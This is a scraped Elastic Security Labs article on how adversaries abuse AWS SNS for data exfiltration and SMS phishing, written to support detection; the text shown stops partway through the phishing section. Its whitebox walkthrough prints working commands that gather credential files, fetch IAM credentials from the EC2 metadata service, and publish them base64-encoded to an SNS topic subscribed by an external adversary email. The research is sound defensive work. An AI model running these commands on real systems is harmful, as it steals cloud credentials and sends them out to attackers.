</ul></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/aws-sns-abuse#data-exfiltration-via-sns"><span>Data Exfiltration via&nbsp;SNS</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/aws-sns-abuse#infrastructure-setup"><span>Infrastructure&nbsp;Setup</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/aws-sns-abuse#the-workflow-in-practice-exfiltrating-sensitive-credentials"><span>The Workflow in Practice: Exfiltrating Sensitive&nbsp;Credentials</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/aws-sns-abuse#challenges-for-adversaries"><span>Challenges for&nbsp;Adversaries:</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/aws-sns-abuse#advantages-for-adversaries"><span>Advantages for&nbsp;Adversaries</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/aws-sns-abuse#smishing-and-phishing"><span>Smishing and&nbsp;Phishing</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/aws-sns-abuse#weaponization-and-pre-testing-considerations"><span>Weaponization and Pre-&nbsp;Testing&nbsp;Considerations</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/aws-sns-abuse#infrastructure-setup-1"><span>**Infrastructure&nbsp;Setup**</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/aws-sns-abuse#sns-topic-created-by-rare-user"><span>SNS Topic Created by Rare&nbsp;User</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/aws-sns-abuse#hunting-query-esql--"><span>Hunting Query (ES|QL) &nbsp;</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/elastic-security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=AWS SNS Abuse: Data Exfiltration and Phishing&amp;url=https://www.elastic.co/security-labs/aws-sns-abuse" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/aws-sns-abuse" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/aws-sns-abuse&amp;title=AWS SNS Abuse: Data Exfiltration and Phishing" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/aws-sns-abuse&amp;title=AWS SNS Abuse: Data Exfiltration and Phishing" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2025<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"AWS SNS Abuse: Data Exfiltration and Phishing","slug":"aws-sns-abuse","date":"2025-03-13","description":"During a recent internal collaboration, we  dug into publicly known SNS abuse attempts and our knowledge of the data source to develop detection capabilities.","image":"Security Labs Images 7.jpg","subtitle":"Exploring how adversaries abuse AWS SNS services and detection capabilities","body":{"raw":"\n# Preamble\n\nWelcome to another installment of AWS detection engineering with Elastic. This article will dive into both how threat adversaries (TA) leverage AWS’ Simple Notification Service (SNS) and how to hunt for indicators of abuse using that data source.\n\nExpect to learn about potential techniques threat adversaries may exercise in regards to SNS. We will also explore security best practices, hardening roles and access, as well as how to craft threat detection logic for SNS abuse.\n\nThis research was the result of a recent internal collaboration that required us to leverage SNS for data exfiltration during a whitebox exercise. During this collaboration, we became intrigued by how a simple publication and subscription (pub/sub) service could be abused by adversaries to achieve various actions on objectives. We dug into publicly known SNS abuse attempts and our knowledge of the data source to assemble this research about detection opportunities.\n\nDo enjoy!\n\n# Understanding AWS SNS\n\nBefore we get started on the details, let’s discuss what AWS SNS is to have a basic foundational understanding.\n\nAWS SNS is a web service that allows users to send and receive notifications from the cloud. Think of it like a news feed service where a digital topic is created, those who are interested with updates subscribe via email, slack, etc. and when data is published to that topic, all subscribers are notified and receive it. This describes what is commonly referred to as a pub/sub service provided commonly by cloud service providers (CSP). In Azure, this is offered as [Web PubSub](https://azure.microsoft.com/en-us/products/web-pubsub), whereas GCP offers [Pub/Sub](https://cloud.google.com/pubsub#documentation). While the names of these services may slightly differ from platform to platform, the utility and purpose do not.\n\nSNS provides two workflows, [application-to-person](https://docs.aws.amazon.com/sns/latest/dg/sns-user-notifications.html) (A2P) , and [application-to-application](https://docs.aws.amazon.com/sns/latest/dg/sns-system-to-system-messaging.html) (A2A) that serve different purposes. A2P workflows focus more on integral operation with AWS services such as Firehose, Lambda, SQS and more. However, for this article we are going to focus our attention on A2P workflows. As shown in the diagram below, an SNS topic is commonly created, allowing subscribers to leverage SMS, email or push notifications for receiving messages.\n\n# ![](/assets/images/aws-sns-abuse/image5.png)\n\n# ![](/assets/images/aws-sns-abuse/image12.png)\n\n**Additional Features:**\n\n**Filter Policies:** Subscribers can  define filtering rules to receive only a relevant subset of messages if they choose. These filter policies are defined in JSON format; specifying which attributes of a message the subscriber is interested in. SNS evaluates these policies server-side before delivery to determine which subscribers the messages should be sent to.\n\n**Encryption**: SNS leverages [server-side encryption](https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html) (SSE) using AWS Key Management Service (KMS) to secure messages at rest. When encryption is enabled, messages are encrypted before being stored in SNS and then decrypted upon delivery to the endpoint. This is of course important for maintaining the security of Personal Identifiable Information (PII) or other sensitive data such as account numbers. Not to fear, although SNS only encrypts at rest, other protocols (such as HTTPS) handle encryption in transit, making it end-to-end (E2E).\n\n**Delivery Retries and Dead Letter Queues (DLQs)**: SNS automatically retries message delivery to endpoints, such as SQS, Lambda, etc. in case of unexpected failures. However, messages that fail to deliver ultimately reside in [DLQs](https://docs.aws.amazon.com/sns/latest/dg/sns-dead-letter-queues.html), which is typically an AWS SQS queue enabling debugging for developers.\n\n**Scalability**: AWS SNS is designed to handle massive message volumes, automatically scaling to accommodate increasing traffic without manual intervention. There are no upfront provisioning requirements, and you pay only for what you use, making it cost-effective for most organizations.\n\nAWS SNS is a powerful tool for facilitating communication in cloud environments. For a deeper understanding, we recommend diving into the existing [documentation](https://docs.aws.amazon.com/sns/latest/dg/welcome.html) from AWS. However, its versatility and integration capabilities also make it susceptible to abuse. In the next section, we explore some scenarios where adversaries might leverage SNS for malicious purposes. \n\n# Whitebox Testing\n\nWhitebox testing involves performing atomic emulations of malicious behavior in a controlled environment, with full visibility into the vulnerable or misconfigured infrastructure and its configurations. This approach is commonly employed in cloud environments to validate detection capabilities during the development of threat detection rules or models targeting specific tactics, techniques, and procedures (TTPs).. Unlike endpoint environments, where adversary simulations often involve detonating malware binaries and tools, cloud-based TTPs typically exploit existing API-driven services through \"living-off-the-cloud\" techniques, making this approach essential for accurate analysis and detection.\n\n## Data Exfiltration via SNS\n\nExfiltration via SNS starts with creating a topic that serves as a proxy for receiving stolen data and delivering it to the external media source, such as email or mobile. Adversaries would then subscribe that media source to the topic so that any data received is forwarded to them. After this is staged, it is only a matter of packaging data and publishing it to the SNS topic, which handles the distribution. This method allows adversaries to bypass traditional data protection mechanisms such as network ACLs, and exfiltrate information to unauthorized external destinations.\n\n**Example Workflow:**\n\n* Land on EC2 instance and perform discovery of sensitive data, stage it for later  \n* Leverage IMDSv2 and STS natively with the installed AWS CLI to get temporary creds  \n* Create a topic in SNS and attach an external email address as a subscriber  \n* Publish sensitive information to the topic, encoded in Base64 (or plaintext)  \n* The external email address receives the exfiltrated data\n\n![Visual workflow for data exfiltration via AWS SNS](/assets/images/aws-sns-abuse/image3.png)  \n\n### Infrastructure Setup\n\nFor the victim infrastructure, we’ll use our preferred infrastructure-as-code (IaC) framework, Terraform. \n\nA [public gist](https://gist.github.com/terrancedejesus/a01aa8f75f715e6baa726a21fcdf2289) has been created, containing all the necessary files to follow this example.. In summary, these Terraform configurations deploy an EC2 instance in AWS within a public subnet. The setup includes a [user-data script](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html) that adds dummy credentials for sensitive data as environment variables, and installs the AWS CLI to emulate a compromised environment. Additionally, the EC2 instance is assigned an IAM role with permissions for `sns:Publish`, `sns:Subscribe` and `sns:CreateTopic`.\n\nThere are several potential ways an adversary might gain initial access to this EC2 instance, including exploiting vulnerable web applications for web shell deployment, using stolen SSH credentials, password spraying or credential stuffing. Within this particular example scenario; let’s assume the attacker gained initial entry via a vulnerable web application, and subsequently uploaded a web shell. The next goal in this case would be persistence via credential access.. This is commonly seen [in-the-wild](https://www.wiz.io/blog/wiz-research-identifies-exploitation-in-the-wild-of-aviatrix-cve-2024-50603) when adversaries target popular 3rd-party software or web apps such as Oracle WebLogic, Apache Tomcat, Atlassian Confluence, Microsoft Exchange and much more.\n\nTo get started, download the Terraform files from the gist. \n\n1. Adjust the variables in the `variables.tf` file to match your setup.  \n   1. Add your whitelisted IPv4 addressfor trusted_ip_cidr  \n   2. Add your local SSH key file path to public_key_path  \n   3. Ensure the ami_id.default is the correct AMI-ID for your region  \n2. Run `terraform init` in the folder to initialize the working directory. \n\nWhen ready, run `terraform apply` to deploy the infrastructure.\n\nA few reminders:\n\n* Terraform uses your AWS CLI default profile, so ensure you’re working with the correct profile in your AWS configuration.  \n* The provided AMI ID is specific to the `us-east-1` region. If you're deploying in a different region, update the AMI ID accordingly in the `variables.tf` file.  \n* Change `trusted_ip_cidr.default` in `variables.tf` from 0.0.0.0/0 (any IP) to your publicly known CIDR range.\n\n![](/assets/images/aws-sns-abuse/image2.png)\n\n*Terraform apply output*\n\nLet’s SSH into our EC2 instance to ensure that our sensitive credentials were created from the user-data script. Note in the `outputs.tf` file, we ensured that the SSH command would be generated for us based on the key path and public IP of our EC2 instance. \n\n![Bash command output for credential check](/assets/images/aws-sns-abuse/image10.png)\n\nWith this infrastructure staged and confirmed, we can then move on to practical execution.\n\n### The Workflow in Practice: Exfiltrating Sensitive Credentials\n\nLet’s step through this workflow in practice, now that our infrastructure is established. As a reminder, the goal of our opportunistic adversary is to check for local credentials, grab what they can and stage the sensitive data locally. Since landing on this EC2 instance, we have identified the AWS CLI exists, and identified we have SNS permissions. Thus, we plan to create a SNS topic, register an external email as a subscriber and then exfiltrateour stolen credentials and other data as SNS messages.\n\nNote: While this example is extremely simple, the goal is to focus on SNS as a methodology for exfiltration. The exact circumstances and scenario will differ depending on the specific infrastructure setup of the victim.\n\n**Identify and Collect Credentials from Common Locations:**  \nOur adversary will target GitHub credentials files and .env files locally with some good ol’ fashioned Bash scripting. This will take the credentials from these files and drop them into the `/tmp` temporary folder, staging them for exfiltration.\n\nCommand: cat /home/ubuntu/.github/credentials /home/ubuntu/project.env \\\u003e /tmp/stolen_creds.txt\n\n![](/assets/images/aws-sns-abuse/image11.png)\n\n**Stage Exfiltration Method by Creating SNS Topic**  \nLet’s leverage the existing AWS CLI to create the SNS topic. As a reminder, this EC2 instance assumes the custom IAM role we created and attached, which allows it to create SNS topics and publish messages. Since the AWS CLI is pre-installed on our EC2 instance, it will retrieve temporary credentials from IMDSv2 for the assumed role when invoked. However, if this were not the case, an adversary could retrieve credentials natively with the following bash code. \n\n```\n# Fetch the IMDSv2 token\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\n\n# Get the IAM role name\nROLE_NAME=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n\n# Fetch the temporary credentials\nCREDENTIALS=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)\n\n# Extract the Access Key, Secret Key, and Token\nAWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')\nAWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')\nAWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Token')\n```\n\nOnce this is complete, let’s attempt to create our SNS topic and the email address that will be used as our external receiver for the exfiltrated data.\n\nCreate Topic Command: ```TOPIC_ARN=$(aws sns create-topic --name \"whitebox-sns-topic\" --query 'TopicArn' --output text)```\n\nSubscribe Command: ```aws sns subscribe --topic-arn \"$TOPIC_ARN\" --protocol email --notification-endpoint \"adversary@protonmail.com\"```\n\nAs shown above after the commands are run, we can then navigate to the inbox of the external email address to confirm subscription. Once confirmed, our external email address will now receive any messages sent to the `whitebox-sns-topic topic` which we plan to use for exfiltration.\n\n![](/assets/images/aws-sns-abuse/image9.png)\n\n**Exfiltrate Data via SNS Publish**  \nAt this point, we have gained access to an EC2 instance, snooped around to understand our environment, identified some services for abuse and some credentials that we want to obtain. Note that our previous steps could all have been accomplished via a simple Bash script that could be dropped on the compromised EC2 instance via our webshell, but this is broken down into individual steps for example purposes..\n\nNext, we can take the data we stored in `/tmp/stolen_creds.txt`, base64 encode it and ship it to our adversary controlled email address via SNS.\n\nCommands:\n\n* Base64 encode contents: ```BASE64_CONTENT=$(base64 /tmp/stolen_creds.txt)``` \n* Publish encoded credentials to our topic: ```aws sns publish --topic-arn \"$TOPIC_ARN\" --message \"$BASE64_CONTENT\" --subject \"Encoded Credentials from EC2\"```\n\n![](/assets/images/aws-sns-abuse/image7.png)\n\nOnce completed, we can simply check our inbox for these exfiltrated credentials.\n\n![](/assets/images/aws-sns-abuse/image1.png)\n\nTaking the payload from our message, we can decode it to see that it represents the credentials we found lying around on the EC2 instance.\n\n![](/assets/images/aws-sns-abuse/image6.png)\n\nAs many adversaries may attempt to establish persistence or laterally move throughout the AWS environment and services, they would then be able to rely on this SNS topic to exfiltrate data for as long as permissions were in scope for the IAM user or role. Additionally, they could set up a recurring job that scans for data on this EC2 instance and continually exfiltrates anything interesting over time. There are many practical options in this scenario for additional chaining that could be done.\n\n**Before continuing, we encourage you to use the following command to destroy your infrastructure once logging out of the SSH connection**: ```terraform destroy --auto-approve```\n\n### Challenges for Adversaries:\n\nOf course, there are many uncertaintiesin any whitebox testing that may prove as roadblocks or hurdles for a TA, both advanced and immature in knowledge, skills and abilities. It is also very dependent on the configuration and environment of the potential victim. Below are additional challenges that adversaries would face.\n\n**Initial Access**: Gaining initial access to the EC2 instance is often the biggest hurdle. This could involve exploiting a vulnerable web application or 3rd-party service, using stolen SSH credentials, password spraying or credential stuffing, or leveraging other means such as social engineering or phishing. Without initial access, the entire attack chain is infeasible.\n\n**Establishing an Active Session**: After gaining access, maintaining an active session can be difficult, especially if the environment includes robust endpoint protection or regular reboots that clear unauthorized activity. Adversaries may need to establish a persistent foothold using techniques like a webshell, reverse shell or an automated dropper script.\n\n**AWS CLI Installed on the Instance**: The presence of the AWS CLI on a public-facing EC2 instance is uncommon and not considered a best practice. Many secure environments avoid pre-installing the AWS CLI, forcing adversaries to bring their own tools or rely on less direct methods to interact with AWS services.\n\n**IAM Role Permissions**: The IAM role attached to the EC2 instance must include permissive policies for SNS actions (`sns:Publish`, `sns:Subscribe`, `sns:CreateTopic, sts:GetCallerIdentity`). Many environments restrict these permissions to prevent unauthorized use, and misconfigurations are often necessary for the attack to succeed. Best security practices such as principle-of-least-privilege (PoLP) would ensure the roles are set up with only necessary permissions.\n\n**Execution of Malicious Scripts**: Successfully executing a script or running commands without triggering alarms (e.g., CloudTrail, GuardDuty, EDR agents) is a challenge. Adversaries must ensure their activities blend into legitimate traffic or use obfuscation techniques to evade detection.\n\n### Advantages for Adversaries\n\nOf course, while there are challenges for the adversary with these techniques, let’s consider some crucial advantages that they may have as well.\n\n* **Blending In with Native AWS Services**: By leveraging AWS SNS for data exfiltration, the adversary's activity appears as legitimate usage of a native AWS flagship service. SNS is commonly used for notifications and data dissemination, making it less likely to raise immediate suspicion.  \n* **Identity Impersonation via IAM Role**: Actions taken via the AWS CLI are attributed to the IAM role attached to the EC2 instance. If the role already has permissions for SNS actions and is used regularly for similar tasks, adversarial activity can blend seamlessly with expected operations.  \n* **No Concerns with Security Groups or Network ACLs**: Since SNS communication occurs entirely within the confines of AWS, there’s no reliance on security group or Network ACL configurations. This bypasses traditional outbound traffic controls, ensuring the adversary's data exfiltration attempts are not blocked.  \n* **Lack of Detections for SNS Abuse**: Abuse of SNS for data exfiltration is under-monitored in many environments. Security teams may focus on more commonly abused AWS services (e.g., S3 or EC2) and lack dedicated detections or alerts for unusual SNS activity, such as frequent topic creation or large volumes of published messages.  \n* **Minimal Footprint with Non-Invasive Commands**: Local commands used by the adversary (e.g., `cat`, `echo`, `base64`) are benign and do not trigger endpoint detection and response (EDR) tools typically. These commands are common in legitimate administrative tasks, allowing adversaries to avoid detection on backend Linux systems.  \n* **Efficient and Scalable Exfiltration**: SNS enables scalable exfiltration by allowing adversaries to send large amounts of data to multiple subscribers. Once set up, the adversary can automate periodic publishing of sensitive information with minimal additional effort.  \n* **Persistent Exfiltration Capabilities**: As long as the SNS topic and subscription remain active, the adversary can use the infrastructure for ongoing exfiltration. This is especially true if the IAM role retains its permissions and no proactive monitoring is implemented.  \n* **Bypassing Egress Monitoring and DLP**: Since the data is exfiltrated through SNS within the AWS environment, it bypasses traditional egress monitoring or data loss prevention solutions that focus on outbound traffic to external destinations.\n\n# In-the-Wild Abuse\n\nWhile whitebox scenarios are invaluable for simulating potential adversarial behaviors, it is equally important to ground these simulations with in-the-wild (ItW) threats. To this end, we explored publicly available research and identified a [key article](https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/) from SentinelOne describing a spam messaging campaign that leveraged AWS SNS. Using insights from this research, we attempted to replicate these techniques in a controlled environment to better understand their implications.\n\nAlthough we will not delve into the attribution analysis outlined in SentinelOne’s research, we highly recommend reviewing their work for a deeper dive into the campaign’s origins. Instead, our focus is on the tools and techniques employed by the adversary to abuse AWS SNS for malicious purposes.\n\n## Smishing and Phishing\n\nCompromised AWS environments with pre-configured SNS services can serve as launchpads for smishing (SMS phishing) or phishing attacks. Adversaries may exploit legitimate SNS topics and subscribers to distribute fraudulent messages internally or externally, leveraging the inherent trust in an organization’s communication channels.\n\nAs detailed in SentinelOne’s [blog](https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/), the adversary employed a Python-based tool known as **SNS Sender**. This script enabled bulk SMS phishing campaigns by interacting directly with AWS SNS APIs using compromised AWS credentials. These authenticated API requests allowed the adversary to bypass common safeguards and send phishing messages in mass..\n\nThe [**SNS Sender script**](https://www.virustotal.com/gui/file/6d8c062c23cb58327ae6fc3bbb66195b1337c360fa5008410f65887c463c3428) leverages valid AWS access keys and secrets to establish authenticated API sessions via the AWS SDK. Armed with these credentials, adversaries can craft phishing workflows that include:\n\n1. Establishing authenticated SNS API sessions via the AWS SDK.  \n2. Enumerating and targeting lists of phone numbers to serve as phishing recipients.  \n3. Utilizing a pre-registered Sender ID (if available) for spoofing trusted entities.  \n4. Sending SMS messages containing malicious links, often impersonating a legitimate service.\n\n![](/assets/images/aws-sns-abuse/image4.png)\n\nElastic Security Labs predicts that the use of one-off or commercially available tools for abusing cloud services, like SNS Sender, will continue to grow as a research focus. This underscores the importance of understanding these tools and their impact on cloud security.\n\n### Weaponization and Pre-Testing Considerations\n\nTo successfully execute a phishing campaign at scale using AWS SNS, the adversary would have needed access to an already registered AWS End User Messaging organization. AWS restricts new accounts to SNS Sandbox Mode, which limits SMS sending to manually verified phone numbers. To bypass sandbox restrictions, adversaries would need access to an account already approved for production SMS messaging. The process of testing and weaponization would have required several key steps.\n\nA fully configured AWS End User Messaging setup would require:\n\n* An established origination identity (which includes a long code, toll-free number, or short code).  \n* Regulatory approval through a brand registration process.  \n* Carrier pre-approval for high-volume SMS messaging.\n\nWithout these pre-registered identifiers, AWS SNS messages may be deprioritized, blocked, or fail to send.\n\nBefore deploying a large-scale attack, adversaries would likely test SMS delivery using verified phone numbers within AWS SNS Sandbox Mode. This process requires:\n\n* Manually verifying phone numbers before sending messages.  \n* Ensuring their carrier allows AWS SNS sandbox messages, as some (like T-Mobile and Google Voice) frequently block AWS SNS sandbox verification SMS.  \n* Testing 